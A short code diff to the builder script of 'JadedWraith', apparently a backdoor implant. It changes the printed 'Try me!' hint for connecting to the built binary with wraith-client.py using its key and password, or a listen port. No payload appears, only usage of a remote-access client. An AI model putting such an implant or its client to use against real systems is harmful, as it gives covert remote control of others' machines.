@@ -167,10 +167,14 @@ def main(args):
         fd.write(s.replace(needle, config_hdr + config))
 
     print("\nJadedWraith Executable : {0}\n".format(colored(binary_path, attrs=['bold'])))
-    print("Try me!") 
-    print(colored("   sudo ./wraith-client.py <IP_ADDRESS> -k {0} -P {1} shell".format(keystr, passwd),
-                    attrs=['bold']))
+    print("Try me!")
 
-
+    if listen_port == 0:
+        print(colored("   sudo ./wraith-client.py <IP_ADDRESS> -k {0} -P {1}".format(keystr, passwd),
+                        attrs=['bold']))
+    else:
+        print(colored("   /wraith-client.py <IP_ADDRESS> -k {0} -p {1}".format(keystr, listen_port),
+                        attrs=['bold']))
+   
 if __name__ == "__main__":
     main(sys.argv)
